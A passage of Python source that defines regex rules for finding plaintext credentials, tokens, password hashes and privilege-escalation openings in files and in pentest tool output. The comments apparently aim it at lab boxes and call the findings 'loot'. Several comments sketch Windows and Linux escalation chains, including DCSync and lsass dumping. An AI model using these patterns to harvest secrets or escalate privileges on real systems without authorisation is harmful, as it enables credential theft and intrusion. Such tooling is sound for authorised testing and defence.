    # iter-26: /etc/passwd GECOS field with embedded plaintext password.
    # Shape: user:x:UID:GID:GECOS:home:shell  - the GECOS can carry an
    # admin's reminder like 'svc-web - default pwd: WinterIsCold2024!'.
    # Only fire when the GECOS contains a 'pass/pwd/cred/default' marker,
    # and reuse filters.extract_pw_from_desc() to find the actual token.
    ("etc passwd GECOS hint", re.compile(
        r'(?m)^([a-z_][a-z0-9_-]{0,31}):[x*!\$][^:]*:\d+:\d+:'
        r'([^:\r\n]*(?:pass|pwd|cred|default)[^:\r\n]*):'
        r'/[^:\r\n]*:/[^:\r\n]*$')),
    # Redis requirepass / masterauth in conf - already partially handled by KEY,
    # but here as a dedicated rule with a service-bound hint.
    ("redis requirepass", re.compile(
        r'(?im)^\s*(requirepass|masterauth)\s+([^\s#]{3,80})')),
    # /etc/sudoers NOPASSWD entry: gives `user` direct root via the named cmd
    # without a password - a single-line privesc primitive.
    ("sudoers NOPASSWD", re.compile(
        r'(?i)^(\S+)\s+\S+\s*=\s*\([^)]*\)\s*NOPASSWD\s*:\s*(\S[^\r\n]{0,200})', re.MULTILINE)),
    # Writable cron entry pointing at a script. iter-8 round-2: the old regex
    # backtracked catastrophically on lines like '----   ----   ---' from
    # smbmap/table output (the broad `[\s/*0-9,-]+` repeated greedily). Now we
    # require EXACTLY 5 cron-time fields - each strictly `*`, `*/N`, `N`,
    # `N,N`, `N-N`, or `N/N` - before the optional user + script path.
    ("cron script ref", re.compile(
        r'^\s*(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
        r'(?:[\w-]+\s+)?'
        r'((?:/[\w./-]+)(?:\.sh|\.py|\.pl|\.rb|\.bash))\b', re.MULTILINE)),
    # Hashcat potfile line (hash:plain). Only fired when the path looks like a
    # potfile (extension/filename gate is in the dispatch branch) AND the hash
    # half starts with a recognised hash prefix ($1$, $2y$, $5$, $6$, $apr1$,
    # $krb5..., $keepass$, $pwsafe$, $sntp-ms$, $DCC2$, $S$, $P$/$H$, $argon2,
    # etc.) or is exactly 32/40 hex - the bare-shape match alone was matching
    # every `attribute: value` LDIF line.
    ("hashcat potfile", re.compile(
        r'^(\$(?:1|2[aby]|5|6|y|argon2[id]+|apr1|S|P|H|NT|DCC2|krb5(?:tgs|asrep|pa)|'
        r'keepass|pwsafe|sntp-ms|ansible|pkcs12|ANSIBLE_VAULT)\$\S{6,}|'
        r'[a-fA-F0-9]{32}|[a-fA-F0-9]{40}|[a-fA-F0-9]{60}):([^\r\n:]{3,100})$',
        re.MULTILINE)),
    # John's john --show output and pot lines: hash:plain too. Pot lines start
    # with $NT$, $krb5tgs$, etc. The plain half must NOT be hex-only or contain
    # a hash-prefix '$' (which would indicate the line is still inside the hash).
    ("john pot", re.compile(
        r'^(\$NT\$[a-fA-F0-9]{32}|\$krb5(?:tgs|asrep|pa)\$\S{20,}):([^\r\n\$:]{3,80})$',
        re.MULTILINE)),
    # AWS credentials INI shape: `[profile]\naws_access_key_id = AKIA...\n
    # aws_secret_access_key = ...`. The secret already matches our 'AWS secret'
    # rule; here we flag the SESSION TOKEN line too.
    ("AWS session token", re.compile(
        r'(?i)\baws_session_token\s*=\s*([A-Za-z0-9/+=]{100,})')),
    # GCP service-account JSON keys: 'private_key' field as PEM blob marker.
    ("GCP service account", re.compile(
        r'"type"\s*:\s*"service_account"[\s\S]{0,200}?"private_key_id"\s*:\s*"([a-f0-9]{40})"')),
    # Kubeconfig bearer token: `token: <jwt>` under user.token, or
    # `client-certificate-data: <b64>` + `client-key-data: <b64>` under user.
    ("kubeconfig token", re.compile(
        r'(?im)^\s*token\s*:\s*([A-Za-z0-9._-]{32,})\s*$')),
    # iter-27: ~/.docker/config.json auth b64. Shape:
    #   "auths": {"registry.io": {"auth": "dXNlcjpwYXNz"}}
    # The b64 decodes to user:password for direct registry auth. Also
    # covers Kubernetes .dockerconfigjson secrets which use the same shape.
    ("docker config auth", re.compile(
        r'"auth"\s*:\s*"([A-Za-z0-9+/]{8,}={0,2})"')),
    # iter-27: Ansible inventory / group_vars password variables. Common
    # in Ansible-provisioned lab boxes (THM Overpass 2 Hacked, HTB Curling,
    # etc). Also covers ansible_ssh_pass (older name) and
    # ansible_winrm_password / ansible_become_password.
    ("ansible var pass", re.compile(
        r'(?im)^\s*(ansible_(?:become_(?:pass(?:word)?)?|ssh_pass|password|'
        r'winrm_pass(?:word)?|paramiko_pass))\s*[:=]\s*'
        r'["\']?([^\s"\'#\r\n]{3,80})["\']?\s*$')),
    # iter-27: GitLab runner config.toml token entry. The [[runners]]
    # section carries `token = "..."` which auths the runner to GitLab.
    ("gitlab runner token", re.compile(
        r'(?im)^\s*token\s*=\s*"([A-Za-z0-9_-]{20,})"\s*$')),
    # iter-27: Chef data_bags encrypted secret (marker). Just flag as
    # INTERESTING; decryption requires the org's shared secret key.
    ("chef databag marker", re.compile(
        r'"encrypted_data"\s*:\s*"[A-Za-z0-9+/]{50,}={0,2}"')),
    # iter-28: systemd .service unit Environment= directive with a plaintext
    # password / token / secret. Common on service-managed lab boxes where
    # a maintainer inlines DB creds instead of using EnvironmentFile=.
    # Shape:
    #   Environment=DB_PASSWORD=SuperSecret!2024
    #   Environment="POSTGRES_PASSWORD=P@ss word"
    # Also matches ExecStart lines with inline env prefix.
    ("systemd Environment=", re.compile(
        r'(?im)^\s*Environment\s*=\s*"?'
        r'([A-Z][A-Z0-9_]{2,40}(?:PASS(?:WORD)?|PWD|SECRET|TOKEN|KEY|CRED))'
        r'=([^"\r\n]{3,200})"?\s*$')),
    # iter-28: RabbitMQ definitions.json users array - handled in
    # _multiline_passes() since the fields span JSON lines.
    # iter-29: APT machine auth (/etc/apt/auth.conf.d/*.conf). Same
    # ~/.netrc format but scoped to APT: 'machine host login user password X'.
    # Common on THM/OSCP+ boxes with private APT repos.
    ("apt auth machine", re.compile(
        r'(?im)^\s*machine\s+(\S+)\s+login\s+(\S+)\s+password\s+(\S+)\s*$')),
    # iter-29: HAProxy userlist entry: 'user admin insecure-password P@ss' or
    # 'user admin password $6$...'. Only fire on the insecure-password form
    # (the hashed form is caught by patterns.py bcrypt/sha512crypt rules).
    ("haproxy user insecure", re.compile(
        r'(?im)^\s*user\s+(\S{1,50})\s+insecure-password\s+(\S{3,80})')),
    # iter-29: rsyncd.conf 'secrets file' pointer - flag the referenced path.
    ("rsyncd secrets pointer", re.compile(
        r'(?im)^\s*secrets\s+file\s*=\s*(\S{3,200})\s*$')),
    # iter-29: Postfix smtp_sasl_password_maps: pointer to a hash file that
    # holds 'smtp.example.com user:password' rows.
    ("postfix sasl map", re.compile(
        r'(?im)^\s*smtp_sasl_password_maps\s*=\s*hash:\s*(\S{3,200})\s*$')),
    # iter-202: Redis Sentinel `sentinel auth-pass <mastername> <password>`
    # line. Common on Redis HA setups (sentinel + master + replicas). The
    # pw is used for Sentinel <-> replica auth. Also handles Sentinel 6+
    # variants like `sentinel deny-scripts-reconfig` (which we filter out
    # via the required "auth-pass" keyword).
    ("Redis Sentinel auth-pass", re.compile(
        r'(?im)^\s*sentinel\s+auth-pass\s+([A-Za-z_][\w.-]{1,60})\s+'
        r'([^\s#\r\n]{3,80})\s*(?:#[^\r\n]*)?$')),
    # iter-202: HashiCorp Vault token file. `~/.vault-token` is a 1-line
    # file containing the raw token used by `vault` CLI. Also matches
    # `VAULT_TOKEN=<token>` env var lines and `X-Vault-Token: <token>`
    # headers. Vault tokens are typically UUIDs (36 char) or hvs.<hex>
    # for service tokens.
    ("Vault token file", re.compile(
        r'(?i)(?:^|\bVAULT_TOKEN\s*[:=]\s*|X-Vault-Token\s*:\s*)'
        r'(hvs\.[A-Za-z0-9._-]{20,}|'
        r's\.[A-Za-z0-9]{20,}|'
        r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})'
        r'(?:$|\s|\r|\n)')),
    # iter-29: haproxy stats socket admin password: 'stats admin if TRUE ...'
    # or 'stats auth admin:P@ss' style
    ("haproxy stats auth", re.compile(
        r'(?im)^\s*stats\s+auth\s+(\S{1,50}):(\S{3,80})\s*$')),
    # iter-32: Java Spring application.properties datasource passwords.
    # Also covers Micronaut / Quarkus (same dot-property shape).
    ("spring datasource props", re.compile(
        r'(?im)^\s*(?:spring\.datasource(?:\.\w+)?|datasources\.\w+|'
        r'quarkus\.datasource(?:\.\w+)?|micronaut\.datasources\.\w+)'
        r'\.(?:password|pwd)\s*=\s*(\S{3,200})\s*$')),
    # iter-32: Python framework SECRET_KEY (Django settings.py, Flask
    # config.py). Also covers FastAPI, Starlette. 16-char minimum to avoid
    # placeholder trigger 'CHANGE_ME'-style short values.
    ("python SECRET_KEY", re.compile(
        r'(?im)^\s*(SECRET_KEY|JWT_SECRET_KEY|SECURITY_PASSWORD_SALT|'
        r'CSRF_SECRET|SESSION_SECRET|FLASK_SECRET)'
        r'\s*=\s*["\']([^"\'\r\n]{16,200})["\']')),
    # iter-32: uppercase-PASSWORD dict entry - Django DATABASES {"PASSWORD":
    # "X"} shape but also fires on any JSON/YAML with that key. Kept because
    # a MongoDB dump / JSON export with a real password in there is loot too;
    # dispatcher relabels based on file context.
    ("uppercase PASSWORD dict entry", re.compile(
        r"(?i)['\"]PASSWORD['\"]\s*:\s*['\"]([^'\"\r\n]{3,200})['\"]")),
    # iter-33: PowerShell $env:VARNAME = 'X' where VARNAME ends in a
    # password / secret / token marker. Common in Windows service-setup
    # scripts on HTB/THM lab boxes that provision creds via PowerShell.
    # Also matches $ENV:varname (case insensitive in PowerShell).
    ("powershell env var secret", re.compile(
        r"(?i)\$env:([A-Z][A-Z0-9_]{2,50}(?:PASSWORD|PASS|PW|PWD|SECRET|"
        r"TOKEN|KEY|CRED))\s*=\s*['\"]([^'\"\r\n]{3,200})['\"]")),
    # iter-33: PowerShell Set-Item env:VAR VALUE alternate form
    ("powershell set-item env", re.compile(
        r"(?i)Set-Item\s+env:([A-Z][A-Z0-9_]{2,50}(?:PASSWORD|PASS|PW|PWD|"
        r"SECRET|TOKEN|KEY|CRED))\s+['\"]([^'\"\r\n]{3,200})['\"]")),
    # iter-43: [Environment]::SetEnvironmentVariable('X', 'Y'[, 'User']) -
    # .NET-style env setter, common in enterprise service-setup scripts.
    ("dotnet env setter", re.compile(
        r"(?i)\[Environment\]::SetEnvironmentVariable\s*\(\s*"
        r"['\"]([A-Z][A-Z0-9_]{2,50}(?:PASSWORD|PASS|PW|PWD|"
        r"SECRET|TOKEN|KEY|CRED))['\"]\s*,\s*"
        r"['\"]([^'\"\r\n]{3,200})['\"]")),
    # iter-57: Kubernetes ServiceAccount JWT. K8s SA tokens have the
    # '/serviceaccount' string in the payload's iss + claim keys, whose
    # base64url encoding always contains 'L3NlcnZpY2VhY2NvdW50' regardless
    # of byte alignment (verified empirically). Distinct from generic
    # JWTs because K8s SAs grant API access to cluster secrets on the
    # pod's behalf.
    ("k8s serviceaccount token", re.compile(
        r'(eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]*'
        r'L3NlcnZpY2VhY2NvdW50'
        r'[A-Za-z0-9_-]*\.[A-Za-z0-9_-]{20,})')),
    # iter-28: PostgreSQL .pgpass row where credline may have already
    # caught it, but a keyword pass emits it into ASSIGNED SECRETS too
    # so the operator sees the host + db context inline.
    ("pgpass row hint", re.compile(
        r'(?m)^([^:\r\n]+):(\d{1,5}|\*):([^:\r\n]+):([^:\r\n]+):'
        r'([^:\r\n#][^:\r\n]{2,80})\s*$')),
    # Terraform state with "sensitive": true output keeps the plaintext value.
    ("Terraform sensitive", re.compile(
        r'"sensitive"\s*:\s*true[\s\S]{0,300}?"value"\s*:\s*"([^"]{3,200})"')),
    # Azure CLI accessTokens.json shape - look for the bearer access token.
    ("Azure access token", re.compile(
        r'"accessToken"\s*:\s*"(eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_.-]+\.[A-Za-z0-9_-]+)"')),
    # Supervisord inet_http_server creds (rare, but a real OSCP-flavored box):
    # `[inet_http_server]\nport=...\nusername=admin\npassword=...`
    ("supervisord inet creds", re.compile(
        r'(?is)\[inet_http_server\][\s\S]{0,500}?username\s*=\s*(\S+)[\s\S]{0,200}?password\s*=\s*(\S+)')),
    # asterisk manager.conf - VoIP boxes (Beep-like)
    ("asterisk manager", re.compile(
        r'(?is)^\s*\[([\w_-]+)\]\s*[\r\n]+(?:[^\r\n]*[\r\n]+)*?secret\s*=\s*([^\s#\r\n]{3,80})', re.MULTILINE)),
    # Veeam VBR plaintext-fielded creds in stored sessions / backup .vbm xml
    ("Veeam creds", re.compile(
        r'(?is)<Cred[^>]*\sUsername\s*=\s*"([^"]{1,80})"[^>]*\sPassword\s*=\s*"([^"]{3,200})"')),
    # GitHub Actions secret REFERENCE - the secret itself is in vault, but the
    # presence of `${{ secrets.X }}` in a checked-out workflow tells the operator
    # which CI secret name to target.
    ("GH Actions secret ref", re.compile(
        r'\$\{\{\s*secrets\.(\w+)\s*\}\}')),
    # Confluence/Atlassian seraph + LDAP password fields in atlassian-user.xml
    ("atlassian secret", re.compile(
        r'(?i)<password>([^<\r\n]{3,80})</password>')),
    # PowerShell SecureString export blob (Export-Clixml of a PSCredential):
    # `<SS N="Password">01000000d08c9ddf01...</SS>`
    ("PSCredential SS blob", re.compile(
        r'<SS\s+N\s*=\s*"Password"\s*>([0-9a-f]{40,})</SS>')),
    # OpenVPN auth-user-pass file (two lines: user, pass)
    ("ovpn auth-user-pass", re.compile(
        r'(?im)^\s*auth-user-pass\s+(\S+)\s*$')),
    # WireGuard PrivateKey in [Interface]
    ("WireGuard PrivateKey", re.compile(
        r'(?im)^\s*PrivateKey\s*=\s*([A-Za-z0-9+/]{42,44}=)\s*$')),
    # NetSCREEN / Cisco IOS enable secret 5/7
    ("Cisco enable secret", re.compile(
        r'(?i)\benable\s+secret\s+(\d)\s+([\S]{6,200})')),
    # JuicyPotato / Print Spooler / SeImpersonate output that lists a token to
    # impersonate. Intel-only.
    ("token impersonation", re.compile(
        r'(?i)SeImpersonatePrivilege|SeAssignPrimaryToken|JuicyPotato\.exe|PrintSpoofer\.exe|GodPotato\.exe|RoguePotato\.exe')),
    # iter-163: SeBackupPrivilege - Backup Operators / hive-save primitive.
    # Direct DA path when captured on a DC (reg save HKLM\SAM / SYSTEM /
    # SECURITY on a domain-joined host = local hashes; on the DC itself =
    # NTDS.dit backup which yields DCSync via impacket-secretsdump LOCAL).
    # Wildly under-detected in OSCP+ walkthroughs where the operator gets
    # a Backup Operators shell and doesn't realise it's game over.
    ("SeBackupPrivilege", re.compile(r'(?i)\bSeBackupPrivilege\b')),
    # iter-163: SeRestorePrivilege - counterpart of Backup, allows arbitrary
    # DACL rewrite + service registry write. Chain: modify HKLM\SYSTEM\
    # CurrentControlSet\Services\* to swap ImagePath -> SYSTEM shell.
    ("SeRestorePrivilege", re.compile(r'(?i)\bSeRestorePrivilege\b')),
    # iter-163: SeTakeOwnershipPrivilege - grant self ownership of any
    # SD-protected object then WriteDacl. Chain: takeown /F -> icacls /grant.
    ("SeTakeOwnershipPrivilege", re.compile(r'(?i)\bSeTakeOwnershipPrivilege\b')),
    # iter-163: SeLoadDriverPrivilege - load unsigned kernel driver (Capcom /
    # dbutil / vulnerable-driver EoP path).
    ("SeLoadDriverPrivilege", re.compile(r'(?i)\bSeLoadDriverPrivilege\b')),
    # iter-163: SeManageVolumePrivilege - file-system permissions bypass.
    # Chain: SeManageVolume exploit -> arbitrary DACL flip -> SYSTEM.
    ("SeManageVolumePrivilege", re.compile(r'(?i)\bSeManageVolumePrivilege\b')),
    # iter-163: SeDebugPrivilege - dump lsass memory (mimikatz sekurlsa /
    # comsvcs.dll MiniDump). Standard admin priv but noise on desktops;
    # relevance is when it appears on a *non-admin* service account.
    ("SeDebugPrivilege", re.compile(r'(?i)\bSeDebugPrivilege\b')),
    # iter-163: SeCreateTokenPrivilege - rare privilege that lets the holder
    # forge a SYSTEM token directly. Almost always a mis-configured service
    # account. Instant SYSTEM if present.
    ("SeCreateTokenPrivilege", re.compile(r'(?i)\bSeCreateTokenPrivilege\b')),
    # iter-163: SeTcbPrivilege - "Act as part of the operating system" -
    # tier-0 privilege; if a non-SYSTEM account has it, straight SYSTEM.
    ("SeTcbPrivilege", re.compile(r'(?i)\bSeTcbPrivilege\b')),
    # ---- iter-8 round-2: operator-tool TYPED output parsers ----
    # NOTE: Mimikatz / Rubeus / PowerView / Lazagne / cmdkey-saved / DPAPI-cred
    # are MULTI-LINE blocks - they live in _multiline_passes() at file scope,
    # not in this per-line _AD loop (catastrophic regex backtracking otherwise).
    # Rubeus single-line markers stay here:
    ("Rubeus ticket b64", re.compile(
        r'(?i)\[\*\]\s*base64\((?:ticket\.kirbi|ticket\.ccache|encoded\s+ticket)\)\s*:')),
    # winPEAS / linPEAS / WinPEASany interesting-finding line: `[+] Looking for X`
    # `[!] FINDING - <detail>`. Pattern is `[+]/[!]/[*]` + the colored section
    # header word that hints at a real privesc primitive.
    ("PEAS finding", re.compile(
        r'(?i)\[(?:[+!*])\]\s+(?:'
        r'(?:Sudo|Mounted|polkit|pkexec|CVE-\d{4}-\d{2,7}|Capabilities|Writable|'
        r'AlwaysInstallElevated|AutoLogon|AutoAdminLogon|Unattended\s+files?|'
        r'LSA\s+Protection|Credential\s+Manager|Saved\s+credentials|'
        r'PowerShell\s+history|Wifi\s+saved|Cached\s+GPP|Pwn3d|'
        r'NOPASSWD|GTFOBins|Token\s+impersonation|Print\s+spooler|'
        r'PS\s+history|MachineKey|machine_key|SAM\s+file|SYSTEM\s+file))[^\r\n]*'
    )),
    # winPEAS AlwaysInstallElevated registry value finding:
    ("AlwaysInstallElevated", re.compile(
        r'(?i)\bAlwaysInstallElevated\s*(?:REG_DWORD)?\s*[:=]?\s*(?:0x)?0*1\b')),
    # Snaffler text output: each line is a colored category + finding.
    # `[<color>][<rule>] {pid} <FILE>` - rule names like `KeepKvpAsRedSecret`
    # `KeepConfigPasswordOrange` `KeepConfigCredentialBlackList` are real loot.
    ("Snaffler red", re.compile(
        r'(?i)\[(?:Red|RED)\]\[(?:[A-Z][A-Za-z]+(?:Red|Black|Yellow)|\w*Secret|'
        r'\w*Password|\w*Credential|\w*Token|\w*Key|\w*Hash)\][\s\S]{0,300}?'
        r'(\\\\[^\s\\]+\\[^\s\\]+(?:\\[^\s]+)*|\\\\[^\s\\]+|/[^\s]+)')),
    # smbmap output: per-share access mask line
    # `Disk        SHARE_NAME    READ ONLY/READ,WRITE/NO ACCESS`
    # the read-WRITE shares are loot for write-where exploit / WAR drop.
    ("smbmap rw share", re.compile(
        r'(?i)^\s*Disk\s+(\S+)\s+(READ,?\s*WRITE|WRITE)\b', re.MULTILINE)),
    # kerbrute userenum: `[+] VALID USERNAME: name@DOMAIN`
    ("kerbrute valid user", re.compile(
        r'(?i)\[\+\]\s+VALID\s+USERNAME\s*:\s*(\S+@\S+)')),
    # PowerView Get-DomainUser kerberoastable block -> _multiline_passes().
    # accesschk.exe writable service / dir. Real accesschk RW lines are:
    #   RW DOMAIN\user    C:\Windows\System32\drivers\foo.sys
    #   RW BUILTIN\Users  \\share\folder\file
    # iter-11 FP audit: require a Windows principal (optional `\` for domain)
    # in col 1 and an absolute path (drive-letter, UNC, or POSIX) in col 2.
    ("accesschk RW", re.compile(
        r'^\s*RW\s+((?:[A-Za-z][\w.\- ]*\\)?[A-Za-z][\w.\-$ ]+?)\s+'
        r'([A-Za-z]:\\\S.*|\\\\\S+\\\S.*|/\S.*)\s*$', re.MULTILINE)),
    # cmdkey /list saved-RDP-credentials section -> _multiline_passes().
    # LinPEAS sudo-version line tied to known CVE: `Sudo version 1.8.31` or
    # similar (CVE-2021-3156 'sudoedit -s' is the classic).
    ("PEAS sudo version", re.compile(
        r'(?i)Sudo\s+version\s+(\d+\.\d+\.\d+)')),
    # SUID find output: `-rwsr-xr-x ... /path/to/binary` of common GTFOBins-able
    # binaries (curl, wget, find, python, perl, etc.).
    # iter-164: expanded significantly - the prior list missed bash/sh/dash
    # (direct shell escape), mount/umount (direct root), chown/chmod (write
    # /etc/passwd), docker (docker group == root), openssl (file read/write
    # as root), apt/yum/dnf/apk (package manager hook execution), crontab,
    # git (pager escape), mysql/sqlite3 (\! shell escape), service/systemctl
    # (spawn as root), and the flock/time/timeout/stdbuf wrapper set that
    # lets the operator prefix an arbitrary command with the SUID wrapper.
    # OSCP+ boxes routinely ship non-obvious SUIDs (Return, Nibbles,
    # PermX-style) that fell through the old list.
    ("SUID GTFOBins", re.compile(
        r'(?im)^[-l]rws[\s\S]{0,120}\s(/(?:usr/)?(?:s?bin|libexec)/'
        r'(?:python\d*|perl|ruby|php|nmap|find|vim|vi|view|rvim|less|more|nano|tee|'
        r'awk|mawk|gawk|cp|mv|cat|tac|tar|zip|unzip|gzip|env|node|wall|dd|expect|rsync|'
        r'gdb|gimp|lua|nice|nohup|pkexec|setarch|socat|strace|'
        r'taskset|tclsh|wget|curl|xargs|xxd|zsh|'
        r'bash|sh|dash|ash|csh|ksh|tcsh|'
        r'mount|umount|chown|chmod|chroot|'
        r'docker|openssl|apt|apt-get|dpkg|yum|dnf|apk|pip|pip3|snap|'
        r'crontab|at|batch|'
        r'git|screen|tmux|'
        r'mysql|psql|sqlite3|'
        r'service|systemctl|systemd-tmpfiles|'
        r'flock|time|timeout|stdbuf|'
        r'iconv|xz|make|ld|'
        r'busybox|ash|sudo|sudoedit|su|'
        r'sed|ed|ex|emacs|'
        r'jq|nl|paste|column|'
        r'ftp|sftp|scp|ssh|smbclient|nc|ncat|netcat|'
        r'strings|readelf|objdump|ltrace|'
        r'watch|top|htop|'
        r'ionice|ip|iptables|nmcli|'
        r'setfacl|getfacl|'
        r'view|vimdiff|ash))$')),
    # `getcap -r /` output - capability bits on binaries.
    # `/usr/bin/python3 = cap_setuid+ep`   (old-style libcap output)
    # `/usr/bin/python3 cap_setuid+ep`     (libcap 2.44+, no `=` separator)
    # iter-11 FP audit: LHS must be an absolute path (rejects Makefile
    # `MY_VAR = cap_setuid_helper`); RHS cap must be properly suffixed.
    # iter-165: accept the modern separator-less form (` ` between path and
    # cap instead of ` = `) and add cap_dac_override to the cap enum
    # (bypasses file permission checks -> read /etc/shadow as non-root).
    ("Linux capability", re.compile(
        r'^(/\S+)\s+(?:=\s+)?(cap_(?:setuid|setgid|net_raw|dac_read_search|'
        r'dac_override|chown|fowner|kill|net_bind_service|sys_admin|'
        r'sys_ptrace|net_admin|sys_module|sys_chroot|sys_time|audit_control)'
        r'(?:[,+=][\w+]+)?)(?:\s|,|$)',
        re.MULTILINE)),
    # iter-215: pkexec CVE-2021-4034 PwnKit hint gate. Not a detector -
    # gate defined below when we see any SUID pkexec entry.
    # NFS export with no_root_squash - direct root via remote NFS mount + suid.
    ("NFS no_root_squash", re.compile(
        r'(?im)^(/\S+)\s+\S[^\r\n]*\bno_root_squash\b')),
    # Cobalt-Strike-like beacon CONFIG dump (operator notes / decoded malleable):
    ("CobaltStrike beacon", re.compile(
        r'(?i)\bC2Server\s*[:=]\s*([^\r\n]{4,100})|'
        r'\bbeacon_id\s*[:=]\s*([0-9a-f]{8,})|'
        r'malleable[\s_-]?profile\s*[:=]\s*"([^"]+)"')),
    # Lazagne section header + cred line -> _multiline_passes() (URL / User / Pass
    # is a multi-line block in Lazagne's output).
    # hashcat status line (informational, single-line):
    # `Recovered.........: 12/1000 (1.20%) Digests, 0/1 (0.00%) Salts`
    ("hashcat status", re.compile(
        r'(?i)^Recovered\.+:\s*(\d+)/(\d+)\s*\(([\d.]+)%\)\s*Digests', re.MULTILINE)),
    # ---- iter-9: deeper-corpus high-value adds (operator notes, OSCP corpus) ----
    # Ansible Vault encrypted blob marker (header line) - flag the file as needing
    # `ansible-vault decrypt` with the vault password.
    ("Ansible Vault header", re.compile(
        r'(?m)^\$ANSIBLE_VAULT;\d\.\d;AES256(?:;\w+)?\s*$')),
    # Firefox logins.json (encrypted but flags the file as crackable via firefox_decrypt)
    ("Firefox logins.json", re.compile(
        r'"encryptedUsername"\s*:\s*"(M[A-Za-z0-9+/=]{20,})"')),
    # Browser password export CSV header - flag the file (rows follow)
    ("browser password CSV", re.compile(
        r'(?im)^\s*name\s*,\s*url\s*,\s*username\s*,\s*password\s*$')),
    # PowerShell one-liner: New-Object PSCredential("user", (ConvertTo-SecureString -String "X" -AsPlainText))
    # Two-group capture; needs dispatch.
    ("PS PSCredential inline", re.compile(
        r'(?i)New-Object\s+(?:System\.Management\.Automation\.)?PSCredential\s*\(\s*'
        r'["\']([^"\']{1,80})["\']\s*,\s*\(\s*ConvertTo-SecureString'
        r'\s+(?:-String\s+)?["\']([^"\']{3,80})["\']')),
    # PowerShell encoded payload base64 (`powershell -enc <b64>`) - common in
    # transcripts / scheduled tasks - flag the b64 blob for offline decode.
    ("PowerShell -enc payload", re.compile(
        r'(?i)\bpowershell(?:\.exe)?\s+(?:-\w+\s+)*-(?:e|enc|EncodedCommand)\s+'
        r'([A-Za-z0-9+/=]{40,})')),
    # GPP cpassword: even outside the strict Groups.xml shape - inline in notes.
    # Distinctive 16+ base64 blob; we keep _AD entry but route to GPP category.
    ("GPP cpassword inline", re.compile(
        r'(?i)\bcpassword\s*=\s*["\']?([A-Za-z0-9+/=]{16,})["\']?')),
    # Grafana datasource basicAuth password in provisioning YAML
    ("Grafana basicAuth", re.compile(
        r'(?i)basicAuthPassword\s*:\s*["\']?([^\s"\'\r\n#]{3,80})')),
    # Splunk passwd / authentication.conf default admin password (already-hashed sha512crypt):
    ("Splunk authentication", re.compile(
        r'(?im)^\s*passwd\s*=\s*(\$6\$[\$\w./]{20,})$')),
    # SCCM CMG token in MEMCM log (eyJ... JWT) - distinctive prefix gate
    ("SCCM CMG token", re.compile(
        r'(?i)\b(?:CMG|CCM)\s*token\s*[:=]\s*(eyJ[A-Za-z0-9_\-\.]{20,})')),
    # Salesforce / Okta / Twilio / SendGrid / Mailgun typed env-var lines.
    # Two groups (VAR_NAME, VALUE); dispatch.
    ("SaaS service token", re.compile(
        r'(?i)\b(SALESFORCE_(?:CLIENT_)?SECRET|OKTA_API_TOKEN|TWILIO_AUTH_TOKEN|'
        r'SENDGRID_API_KEY|MAILGUN_API_KEY|HEROKU_API_KEY|DATADOG_API_KEY|'
        r'PAGERDUTY_API_KEY|NEW_RELIC_LICENSE_KEY|FASTLY_API_KEY|CLOUDFLARE_API_TOKEN)'
        r'\s*[:=]\s*["\']?([^"\'\s#\r\n]{16,200})')),
    # `git config --list` exposing http.<url>.extraheader = AUTHORIZATION: bearer <tok>
    ("git extraheader", re.compile(
        r'(?i)http\.[^\s=]+\.extraheader\s*=\s*AUTHORIZATION:\s*\w+\s+(\S+)')),
    # rclone.conf saved cloud token (one-line shape)
    ("rclone token", re.compile(
        r'(?im)^\s*token\s*=\s*\{["\']access_token["\']\s*:\s*["\']([^"\']{20,})["\']')),
    # ---- iter-11 deep-corpus adds (audit wijdgt0aa) ----
    # AAD / MSA refresh token (AzureAD / Office 365 token endpoint reply).
    # `0.AVoA...`, `M.XXX...`, `1.AVoA...` are the canonical leading-byte forms.
    ("AAD/MSA refresh token", re.compile(
        r'"refresh_token"\s*:\s*"(0\.[A-Za-z0-9_\-]{20,}(?:\.[A-Za-z0-9_\-]+){1,5}|'
        r'M\.[A-Za-z0-9_.\-]{100,}|1\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]+)"')),
    # AAD FOCI marker - a "1" foci flag means the refresh token is FOCI and
    # can be exchanged for tokens for ANY 1P Microsoft app.
    ("AAD FOCI marker", re.compile(
        r'"foci"\s*:\s*"1"')),
    # Cisco IOS type-7 reversible XOR password (instant decode via published key).
    # Distinct from "Cisco enable secret" (which captures the type digit).
    ("Cisco type-7 password", re.compile(
        r'(?i)(?:^|[\s,;])(?:password|enable\s+password|key-string|key\s+\d+)\s+7\s+'
        r'([0-9A-Fa-f]{4,}(?:[0-9A-Fa-f]{2})+)\b')),
    # PFX / certutil / certreq / openssl pkcs12 password on the cmdline.
    ("PFX export/import password", re.compile(
        r'(?i)\b(?:certutil(?:\.exe)?|certreq(?:\.exe)?|openssl\s+pkcs12)\b[^\n]{0,200}?'
        r'\s-(?:p|passin|passout|password)\s+(?:pass:)?["\']?([^\s"\'#]{3,80})')),
    # Certipy/Rubeus -pfx -password chain (HTB Sizzle/Authority/Certified)
    ("Certipy -pfx password", re.compile(
        r'(?i)\bcertipy(?:-ad)?\s+auth\b[^\n]*?-pfx\s+\S+[^\n]*?-password\s+["\']?([^\s"\'#]{3,80})')),
    # mRemoteNG saved-node creds (XML attribute on a Node element).
    ("mRemoteNG Node creds", re.compile(
        r'(?is)<Node\b[^>]*?\bUsername\s*=\s*"([^"]{1,80})"[^>]*?'
        r'\bPassword\s*=\s*"([A-Za-z0-9+/=]{8,400})"')),
    # Pidgin IM accounts.xml plaintext password block - handled at file scope
    # in _multiline_passes() because the <account> block spans multiple lines.
    # curl/wget/httpie/Invoke-WebRequest `-u user:pass` or `--user=user:pass`.
    ("curl/wget -u basic-auth", re.compile(
        r'(?i)\b(?:curl|wget|http(?:ie)?|Invoke-WebRequest|iwr)\b[^\n]{0,200}?'
        r'(?:\s-u\s+|--user(?:name)?[\s=])'
        r'["\']?([^\s:"\']{1,60}):([^\s"\']{3,80})["\']?(?=\s|$)')),
